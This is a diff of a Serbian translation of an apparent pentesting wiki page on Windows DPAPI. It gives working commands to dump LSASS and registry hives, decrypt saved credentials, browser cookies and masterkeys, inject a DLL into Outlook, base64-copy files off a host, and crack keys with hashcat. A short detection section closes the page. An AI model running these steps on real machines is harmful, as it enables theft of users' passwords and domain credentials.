@@ -6,33 +6,33 @@
 
 ## Šta je DPAPI
 
-The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.
+The Data Protection API (DPAPI) se primarno koristi u Windows operativnom sistemu za **simetričnu enkripciju asimetričnih privatnih ključeva**, koristeći ili korisničke ili sistemske tajne kao značajan izvor entropije. Ovaj pristup pojednostavljuje enkripciju za developere tako što im omogućava da šifruju podatke koristeći ključ izveden iz korisničkih logon tajni ili, za sistemsku enkripciju, iz tajni za autentifikaciju domena sistema, čime se eliminiše potreba da developeri sami upravljaju zaštitom ključa za enkripciju.
 
-The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.
+Najčešći način upotrebe DPAPI je preko **`CryptProtectData` i `CryptUnprotectData`** funkcija, koje omogućavaju aplikacijama da sigurno šifruju i dešifruju podatke sa sesijom procesa koji je trenutno prijavljen. To znači da šifrovane podatke može dešifrovati samo isti korisnik ili sistem koji ih je i šifrovao.
 
 Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.
 
-### Generisanje korisničkog ključa
+### Generisanje korisničkih ključeva
 
-The DPAPI generates a unique key (called **`pre-key`**) for each user based on their credentials. This key is derived from the user's password and other factors and the algorithm depends on the type of user but ends being a SHA1. For example, for domain users, **it depends on the NTLM hash of the user**.
+DPAPI generiše jedinstveni ključ (nazvan **`pre-key`**) za svakog korisnika zasnovan na njihovim akreditivima. Ovaj ključ se izvodi iz korisničke lozinke i drugih faktora, a algoritam zavisi od tipa korisnika ali se završava kao SHA1. Na primer, za korisnike domena, **zavisi od NTLM hash-a korisnika**.
 
-This is specially interesting because if an attacker can obtain the user's password hash, they can:
+Ovo je posebno interesantno jer ako napadač može da pribavi korisnički hash lozinke, može:
 
-- **Decrypt any data that was encrypted using DPAPI** with that user's key without needing to contact any API
-- Try to **crack the password** offline trying to generate the valid DPAPI key
+- **Dešifrovati bilo koje podatke koji su bili šifrovani koristeći DPAPI** sa tim korisničkim ključem bez potrebe za kontaktiranjem bilo kog API-ja
+- Pokušati da **razbije lozinku** offline pokušavajući da generiše validan DPAPI ključ
 
-Moreover, every time some data is encrypted by a user using DPAPI, a new **master key** is generated. This master key is the one actually used to encrypt data. Each master key is given with a **GUID** (Globally Unique Identifier) that identifies it.
+Štaviše, svaki put kada korisnik šifruje neke podatke koristeći DPAPI, generiše se novi **master key**. Taj master key je onaj koji se zapravo koristi za šifrovanje podataka. Svakom master ključu je dodeljen **GUID** (Globally Unique Identifier) koji ga identifikuje.
 
-The master keys are stored in the **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory, where `{SID}` is the Security Identifier of that user. The master key is stored encrypted by the user's **`pre-key`** and also by a **domain backup key** for recovery (so the same key is stored encrypted 2 times by 2 different pass).
+Master ključevi se čuvaju u direktorijumu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gde je `{SID}` Security Identifier tog korisnika. Master ključ je sačuvan šifrovan pomoću korisničkog **`pre-key`** i takođe pomoću **rezervnog (backup) ključa domena** za oporavak (tako je isti ključ sačuvan šifrovan dva puta pomoću dva različita ključa).
 
-Note that the **domain key used to encrypt the master key is in the domain controllers and never changes**, so if an attacker has access to the domain controller, they can retrieve the domain backup key and decrypt the master keys of all users in the domain.
+Napomena da je **domain key koji se koristi za šifrovanje master ključa na domain controller-ima i nikada se ne menja**, tako da ako napadač ima pristup domain controller-u, može preuzeti rezervni ključ domena i dešifrovati master ključeve svih korisnika u domenu.
 
-The encrypted blobs contain the **GUID of the master key** that was used to encrypt the data inside its headers.
+Šifrovani blobovi sadrže **GUID master ključa** koji je korišćen za šifrovanje podataka unutar svojih hedera.
 
 > [!TIP]
-> DPAPI encrypted blobs starts with **`01 00 00 00`**
+> DPAPI encrypted blobs počinju sa **`01 00 00 00`**
 
-Pronađite master ključeve:
+Pronađi master ključeve:
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -47,35 +47,43 @@ This is what a bunch of Master Keys of a user will looks like:
 
 ### Machine/System key generation
 
-Ovo je ključ koji mašina koristi za enkripciju podataka. Baziran je na **DPAPI_SYSTEM LSA secret**, koji je poseban ključ kojem može pristupiti samo SYSTEM korisnik. Ovaj ključ se koristi za enkriptovanje podataka kojima sam sistem treba da pristupi, kao što su kredencijali na nivou mašine ili sistemske tajne.
+Ovo je ključ koji mašina koristi za enkriptovanje podataka. Baziran je na **DPAPI_SYSTEM LSA secret**, koji je specijalan ključ kojem može pristupiti samo SYSTEM user. Ovaj ključ se koristi za enkriptovanje podataka koji moraju biti dostupni samom sistemu, kao što su machine-level credentials ili system-wide secrets.
 
-Imajte na umu da ovi ključevi **nemaju rezervnu kopiju na domenu** pa su dostupni samo lokalno:
+Obratite pažnju da ovi ključevi **nemaju rezervnu kopiju na domenu** pa su dostupni samo lokalno:
 
-- **Mimikatz** može pristupiti tako što će dump-ovati LSA secrets koristeći komandu: `mimikatz lsadump::secrets`
-- Tajna je smeštena u registru, pa administrator može **izmeniti DACL dozvole da bi joj pristupio**. Putanja u registru je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- **Mimikatz** može mu pristupiti ispisivanjem LSA secrets koristeći komandu: `mimikatz lsadump::secrets`
+- Tajna je smeštena u registru, tako da administrator može **izmeniti DACL dozvole da bi joj pristupio**. Putanja u registru je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- Takođe je moguća offline ekstrakcija iz registry hives. Na primer, kao administrator na cilju, sačuvajte hive-ove i izvezite ih:
+```cmd
+reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
+reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
+```
+Zatim, na vašem analysis box-u, oporavite DPAPI_SYSTEM LSA secret iz hives i upotrebite ga za dešifrovanje machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, itd.):
+```text
+mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
+# Look for the DPAPI_SYSTEM secret in the output
+```
+### Podaci zaštićeni pomoću DPAPI
 
+Među ličnim podacima zaštićenim od strane DPAPI nalaze se:
 
-### Protected Data by DPAPI
-
-Među ličnim podacima koje štiti DPAPI su:
-
-- Windows kredencijali
-- šifre i podaci za automatsko popunjavanje Internet Explorera i Google Chrome-a
-- šifre za e-mail i interne FTP naloge u aplikacijama kao što su Outlook i Windows Mail
-- šifre za deljene foldere, resurse, bežične mreže i Windows Vault, uključujući ključeve za enkripciju
-- šifre za remote desktop konekcije, .NET Passport i privatne ključeve za razne enkripcijske i autentifikacione svrhe
-- mrežne lozinke koje upravlja Credential Manager i lični podaci u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger i slično
-- enkriptovani blob-ovi unutar registra
+- Windows creds
+- Lozinke i podaci za automatsko popunjavanje Internet Explorer i Google Chrome
+- Lozinke za e-mail i interne FTP naloge u aplikacijama kao što su Outlook i Windows Mail
+- Lozinke za deljene foldere, resurse, bežične mreže i Windows Vault, uključujući enkripcijske ključeve
+- Lozinke za remote desktop konekcije, .NET Passport i privatne ključeve za različite enkripcijske i autentifikacione svrhe
+- Mrežne lozinke kojima upravlja Credential Manager i lični podaci u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger i dr.
+- Šifrovani blobovi unutar registra
 - ...
 
 Sistemski zaštićeni podaci uključuju:
-- WiFi lozinke
-- lozinke za zakazane zadatke
+- Wi‑Fi lozinke
+- Lozinke za zakazane zadatke
 - ...
 
-### Master key extraction options
+### Opcije ekstrakcije master ključa
 
-- Ako korisnik ima privilegije domenskog administratora, može pristupiti **ključu za rezervnu kopiju domena** kako bi dešifrovao sve korisničke master ključeve u domenu:
+- Ako korisnik ima domain admin privilegije, može pristupiti **domain backup key** kako bi dekriptovao sve korisničke master ključeve u domenu:
 ```bash
 # Mimikatz
 lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
@@ -83,17 +91,17 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-- Sa lokalnim administratorskim privilegijama moguće je **pristupiti LSASS memoriji** i izvući DPAPI master ključeve svih povezanih korisnika i SYSTEM ključ.
+- Sa lokalnim administratorskim privilegijama moguće je **pristupiti LSASS memoriji** kako bi se izvukli DPAPI master ključevi svih povezanih korisnika i SYSTEM ključ.
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-- Ako korisnik ima lokalne administratorske privilegije, može pristupiti **DPAPI_SYSTEM LSA secret** kako bi dekriptovao glavne ključeve mašine:
+- Ako korisnik ima lokalne administratorske privilegije, može pristupiti **DPAPI_SYSTEM LSA secret** da dešifruje glavne ključeve mašine:
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
 ```
-- Ako su password ili hash NTLM korisnika poznati, možete **decrypt the master keys of the user directly**:
+- Ako je poznata lozinka ili NTLM hash korisnika, možete **direktno dešifrovati master ključeve korisnika**:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected
@@ -101,7 +109,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- Ako ste u sesiji kao korisnik, moguće je zatražiti od DC-a **backup key to decrypt the master keys using RPC**. Ako ste local admin i korisnik je prijavljen, možete **steal his session token** za ovo:
+- Ako ste u sesiji kao korisnik, moguće je zatražiti od DC-a **backup key to decrypt the master keys using RPC**. Ako ste lokalni admin i korisnik je prijavljen, možete za ovo **steal his session token**:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -109,7 +117,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-## Lista Vault-a
+## Lista Vault
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -121,12 +129,12 @@ mimikatz vault::list
 
 ### Pronalaženje DPAPI šifrovanih podataka
 
-Uobičajeni **zaštićeni fajlovi** korisnika nalaze se u:
+Uobičajeni korisnički **zaštićeni fajlovi** nalaze se u:
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
-- Takođe proverite zamenu `\Roaming\` sa `\Local\` u gore navedenim putanjama.
+- Takođe proverite menjanjem `\Roaming\` u `\Local\` u gore navedenim putanjama.
 
 Primeri enumeracije:
 ```bash
@@ -135,7 +143,7 @@ dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može pronaći DPAPI šifrovane blobove u fajl sistemu, registry-ju i B64 blobovima:
+[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može pronaći DPAPI šifrovane blob-ove u fajl sistemu, registru i B64 blob-ovima:
 ```bash
 # Search blobs in the registry
 search /type:registry [/path:HKLM] # Search complete registry by default
@@ -150,11 +158,39 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-Imajte na umu da [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz istog repozitorijuma) može da se koristi za dešifrovanje DPAPI-om zaštićenih osetljivih podataka, kao što su cookies.
+Imajte na umu da [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz istog repozitorijuma) može da se koristi za dešifrovanje osetljivih podataka pomoću DPAPI, kao što su cookies.
+
+#### Chromium/Edge/Electron brzi recepti (SharpChrome)
+
+- Trenutni korisnik, interaktivno dešifrovanje sačuvanih logins/cookies (radi čak i sa Chrome 127+ app-bound cookies jer se dodatni ključ rešava iz korisnikovog Credential Manager-a kada se pokreće u korisničkom kontekstu):
+```cmd
+SharpChrome logins  /browser:edge  /unprotect
+SharpChrome cookies /browser:chrome /format:csv /unprotect
+```
+- Offline analiza kada imate samo fajlove. Prvo ekstrahujte AES state key iz profila “Local State”, a zatim ga upotrebite da dešifrujete cookie DB:
+```cmd
+# Dump the AES state key from Local State (DPAPI will be used if running as the user)
+SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
+# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
+SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
+```
+- Trijaža na nivou cele domene/udaljena kada imate DPAPI domain backup key (PVK) i admin na ciljnom hostu:
+```cmd
+SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
+SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
+```
+- Ako imate DPAPI prekey/credkey korisnika (iz LSASS), možete preskočiti password cracking i direktno dešifrovati podatke profila:
+```cmd
+# For SharpChrome use /prekey; for SharpDPAPI use /credkey
+SharpChrome cookies /browser:edge /prekey:SHA1_HEX
+SharpDPAPI.exe credentials /credkey:SHA1_HEX
+```
+Napomene
+- Novije Chrome/Edge verzije mogu skladištiti određene kolačiće koristeći "App-Bound" enkripciju. Offline dekripcija tih specifičnih kolačića nije moguća bez dodatnog app-bound key; pokrenite SharpChrome u kontekstu ciljnog korisnika da biste ga automatski dohvatili. Pogledajte objavu na Chrome security blogu navedenu ispod.
 
 ### Pristupni ključevi i podaci
 
-- **Use SharpDPAPI** za dobijanje kredencijala iz DPAPI-šifrovanih fajlova iz trenutne sesije:
+- **Koristite SharpDPAPI** da dobijete kredencijale iz DPAPI enkriptovanih fajlova iz trenutne sesije:
 ```bash
 # Decrypt user data
 ## Note that 'triage' is like running credentials, vaults, rdg and certificates
@@ -163,7 +199,7 @@ SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect
 # Decrypt machine data
 SharpDPAPI.exe machinetriage
 ```
-- **Dohvati informacije o credentials** kao što su encrypted data i guidMasterKey.
+- **Preuzmi informacije o credentials** kao šifrovane podatke i guidMasterKey.
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -173,9 +209,9 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-- **Access masterkeys**:
+- **Pristup masterkeys**:
 
-Dekriptirajte masterkey korisnika koji zahteva **domain backup key** koristeći RPC:
+Dešifrujte masterkey korisnika koji zahteva **domain backup key** koristeći RPC:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -183,7 +219,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-Alat **SharpDPAPI** takođe podržava ove argumente za dešifrovanje masterkey-a (obratite pažnju da je moguće koristiti `/rpc` za preuzimanje domain backup key-a, `/password` za korišćenje plaintext password-a, ili `/pvk` za navođenje DPAPI domain private key fajla...):
+The **SharpDPAPI** alat takođe podržava sledeće argumente za dešifrovanje masterkey-a (primetite kako je moguće koristiti `/rpc` da biste dobili domains backup key, `/password` da biste koristili plaintext password, ili `/pvk` da navedete DPAPI domain private key file...):
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -203,7 +239,7 @@ dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 # SharpDPAPI
 SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
-Alat **SharpDPAPI** takođe podržava ove argumente za dešifrovanje `credentials|vaults|rdg|keepass|triage|blob|ps` (napomena: moguće je koristiti `/rpc` da se dobije rezervni ključ domena, `/password` da se koristi lozinka u plaintextu, `/pvk` da se navede fajl privatnog ključa DPAPI domena, `/unprotect` da se iskoristi trenutna korisnička sesija...):
+Alat **SharpDPAPI** takođe podržava ove argumente za dekripciju `credentials|vaults|rdg|keepass|triage|blob|ps` (primetite kako je moguće koristiti `/rpc` da biste dobili domains backup key, `/password` da biste koristili plaintext password, `/pvk` da biste naveli DPAPI domain private key file, `/unprotect` da biste koristili trenutnu korisničku sesiju...):
 ```
 Decryption:
 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -222,7 +258,17 @@ Targeting:
 Note: must use with /pvk:KEY or /password:X
 Note: not applicable to 'blob' or 'ps' commands
 ```
-- Dekriptiraj neke podatke koristeći **trenutnu korisničku sesiju**:
+- Korišćenje DPAPI prekey/credkey direktno (nije potrebna lozinka)
+
+Ako možete da dump-ujete LSASS, Mimikatz često izlaže per-logon DPAPI key koji se može koristiti za dešifrovanje korisnikovih masterkeys bez poznavanja plaintext password-a. Prosledite ovu vrednost direktno alatima:
+```cmd
+# SharpDPAPI accepts the "credkey" (domain or local SHA1)
+SharpDPAPI.exe triage /credkey:SHA1_HEX
+
+# SharpChrome accepts the same value as a "prekey"
+SharpChrome logins /browser:edge /prekey:SHA1_HEX
+```
+- Dešifruj neke podatke koristeći **trenutnu korisničku sesiju**:
 ```bash
 # Mimikatz
 dpapi::blob /in:C:\path\to\encrypted\file /unprotect
@@ -231,11 +277,46 @@ dpapi::blob /in:C:\path\to\encrypted\file /unprotect
 SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ```
 ---
+
+### Vanmrežno dešifrovanje sa Impacket dpapi.py
+
+Ako imate SID korisnika žrtve i njegovu lozinku (ili NT hash), možete dešifrovati DPAPI masterkeys i Credential Manager blobs potpuno vanmrežno koristeći Impacket’s dpapi.py.
+
+- Identifikujte artefakte na disku:
+- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
+- Odgovarajući masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}
+
+- Ako su alatke za prenos fajlova nepouzdane, base64-ujte fajlove na hostu i kopirajte izlaz:
+```powershell
+# Base64-encode files for copy/paste exfil
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
+```
+- Dekriptiraj masterkey koristeći korisnikov SID i password/hash:
+```bash
+# Plaintext password
+python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
+-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'
+
+# Or with NT hash
+python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
+-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
+```
+- Koristite dešifrovani masterkey da dešifrujete credential blob:
+```bash
+python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
+# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
+# Username=<user> ; Password=<cleartext>
+```
+Ovaj tok rada često vraća domenske kredencijale koje su aplikacije sačuvale koristeći Windows Credential Manager, uključujući administratorske naloge (npr. `*_adm`).
+
+---
+
 ### Rukovanje opcionom entropijom ("Third-party entropy")
 
-Neke aplikacije prosleđuju dodatnu vrednost **entropije** funkciji `CryptProtectData`. Bez ove vrednosti blob se ne može dešifrovati, čak i ako je poznat ispravan masterkey. Dobijanje entropije je stoga neophodno kada se ciljaju kredencijali zaštićeni na ovaj način (npr. Microsoft Outlook, neki VPN klijenti).
+Neke aplikacije prosleđuju dodatnu vrednost **entropy** funkciji `CryptProtectData`. Bez te vrednosti blob se ne može dešifrovati, čak i ako je poznat odgovarajući masterkey. Dobijanje entropije je stoga od suštinskog značaja prilikom ciljanja kredencijala zaštićenih na ovaj način (npr. Microsoft Outlook, neki VPN klijenti).
 
-[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je user-mode DLL koji hook-uje DPAPI funkcije unutar ciljanog procesa i transparentno snima svaku opcionu entropiju koja je prosleđena. Pokretanje EntropyCapture u **DLL-injection** režimu protiv procesa kao što su `outlook.exe` ili `vpnclient.exe` generisaće fajl koji mapira svaki entropy buffer na pozivajući proces i blob. Uhvaćena entropija se kasnije može proslediti **SharpDPAPI** (`/entropy:`) ili **Mimikatz** (`/entropy:<file>`) kako bi se podaci dešifrovali.
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je user-mode DLL koji hookuje DPAPI funkcije unutar ciljnog procesa i transparentno beleži svaku opcionu **entropy** koja je prosleđena. Pokretanje EntropyCapture u **DLL-injection** modu protiv procesa kao što su `outlook.exe` ili `vpnclient.exe` generisaće fajl koji mapira svaki entropy buffer na pozivajući proces i blob. Uhvaćena entropija se kasnije može proslediti alatima **SharpDPAPI** (`/entropy:`) ili **Mimikatz** (`/entropy:<file>`) kako bi se podaci dešifrovali.
 ```powershell
 # Inject EntropyCapture into the current user's Outlook
 InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
@@ -243,9 +324,9 @@ InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
 # Later decrypt a credential blob that required entropy
 SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
-### Cracking masterkeys offline (Hashcat & DPAPISnoop)
+### Razbijanje masterkey-ja offline (Hashcat & DPAPISnoop)
 
-Microsoft je uveo **context 3** masterkey format počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) je dodao hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), što omogućava GPU-accelerated cracking of user passwords directly from the masterkey file. Napadači stoga mogu izvoditi word-list ili brute-force napade bez interakcije sa ciljnim sistemom.
+Microsoft je uveo **context 3** masterkey format počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) je dodao hash-modeove **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), omogućavajući GPU-ubrzano krekovanje korisničkih lozinki direktno iz masterkey fajla. Napadači stoga mogu izvoditi word-list ili brute-force napade bez interakcije sa ciljnim sistemom.
 
 `DPAPISnoop` (2024) automatizuje proces:
 ```bash
@@ -253,11 +334,11 @@ Microsoft je uveo **context 3** masterkey format počevši od Windows 10 v1607 (
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-Alat takođe može da parsira Credential i Vault blobs, dekriptuje ih pomoću cracked keys i izveze cleartext passwords.
+Alat takođe može parsirati Credential and Vault blobs, dekriptovati ih pomoću cracked keys i izvesti cleartext passwords.
 
-### Pristup podacima druge mašine
+### Pristup podacima drugog računara
 
-U **SharpDPAPI and SharpChrome** možete navesti opciju **`/server:HOST`** da pristupite podacima udaljene mašine. Naravno, morate moći da pristupite toj mašini, i u sledećem primeru se pretpostavlja da je **domain backup encryption key is known**:
+U **SharpDPAPI and SharpChrome** možete navesti opciju **`/server:HOST`** da pristupite podacima udaljenog računara. Naravno, morate moći da pristupite tom računaru i u sledećem primeru se pretpostavlja da je poznat **domain backup encryption key**:
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
@@ -266,49 +347,51 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 ### HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatski izvlači sve korisnike i računare iz LDAP direktorijuma i izvlači domain controller backup key kroz RPC. Skripta će potom rešiti IP adrese svih računara i pokrenuti smbclient na svim računarima da bi preuzela sve DPAPI blob-ove svih korisnika i dešifrovala sve pomoću domain backup key.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje ekstrakciju svih korisnika i računara iz LDAP direktorijuma i ekstrakciju ključa za rezervnu kopiju kontrolera domena preko RPC. Skripta će zatim razrešiti IP adrese svih računara i izvršiti smbclient na svim računarima da preuzme sve DPAPI blobove svih korisnika i dešifruje sve pomoću ključa za rezervnu kopiju domena.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-Sa listom računara izvađenom iz LDAP-a možete pronaći svaku podmrežu čak i ako ih niste znali!
+Sa listom računara izvučenom iz LDAP-a možete pronaći svaku podmrežu čak i ako je niste znali!
 
 ### DonPAPI 2.x (2024-05)
 
-[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski izvući tajne zaštićene DPAPI. Verzija 2.x je uvela:
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski iskopati tajne zaštićene DPAPI-jem. Verzija 2.x je uvela:
 
-* Paralelno prikupljanje blob-ova sa stotina hostova
-* Parsiranje **context 3** masterkey-jeva i automatska integracija sa Hashcat cracking-om
-* Podršku za Chrome "App-Bound" enkriptovane cookies (vidi sledeći odeljak)
-* Novi **`--snapshot`** mod za periodično ispitivanje endpoint-a i diff novokreiranih blob-ova
+* Paralelno prikupljanje blobova sa stotina hostova
+* Parsiranje **context 3** masterkey-eva i automatska integracija sa Hashcat za crackovanje
+* Podrška za Chrome "App-Bound" šifrovane kolačiće (pogledajte sledeći odeljak)
+* Novi **`--snapshot`** režim za ponovljeno ispitivanje endpointa i upoređivanje novo-nastalih blobova
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault fajlove koji može da izbacuje formate za Hashcat/JtR i opciono automatski pokreće cracking. Potpuno podržava machine i user masterkey formate do Windows 11 24H1.
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault fajlove koji može izbaciti Hashcat/JtR formate i opcionalno automatski pokrenuti crackovanje. Potpuno podržava machine i user masterkey formate do Windows 11 24H1.
 
-## Uobičajene detekcije
 
-- Pristup fajlovima u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim DPAPI-povezanim direktorijumima.
-- Posebno sa network share-a kao što su **C$** ili **ADMIN$**.
-- Upotreba **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristup LSASS memoriji ili dump-ovanje masterkey-jeva.
-- Događaj **4662**: *An operation was performed on an object* – može se korelisati sa pristupom objektu **`BCKUPKEY`**.
-- Događaj **4673/4674** kada proces zahteva *SeTrustedCredManAccessPrivilege* (Credential Manager)
+## Uobičajena detekcija
+
+- Pristup fajlovima u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim direktorijumima vezanim za DPAPI.
+- Posebno sa mrežnog deljenja kao **C$** ili **ADMIN$**.
+- Korišćenje **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristup LSASS memoriji ili iskopavanje masterkey-eva.
+- Event **4662**: *An operation was performed on an object* – može se povezati sa pristupom objektu **`BCKUPKEY`**.
+- Event **4673/4674** kada proces zahteva *SeTrustedCredManAccessPrivilege* (Credential Manager)
 
 ---
-### 2023-2025 ranjivosti i promene u ekosistemu
+### 2023-2025 ranjivosti & promene u ekosistemu
 
-* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembar 2023). Napadač sa mrežnim pristupom mogao je prevariti članicu domena da preuzme zlonamerni DPAPI backup key, omogućavajući dešifrovanje korisničkih masterkey-jeva. Ispravljeno u kumulativnom ažuriranju iz novembra 2023 — administratori treba da osiguraju da su DC-ovi i radne stanice potpuno zakrpljeni.
-* **Chrome 127 “App-Bound” cookie encryption** (jul 2024) zamenio je nasleđenu DPAPI-only zaštitu dodatnim ključem koji se čuva u korisnikovom **Credential Manager**. Offline dešifrovanje kolačića sada zahteva i DPAPI masterkey i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x mogu da povrate dodatni ključ kada se pokreću u korisničkom kontekstu.
+* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Napadač sa mrežnim pristupom je mogao prevariti člana domena da preuzme maliciozni DPAPI backup ključ, omogućavajući dešifrovanje korisničkih masterkey-eva. Ispravljeno u kumulativnom ažuriranju iz novembra 2023 – administratori treba da osiguraju da su DCs i radne stanice potpuno zakrpljeni.
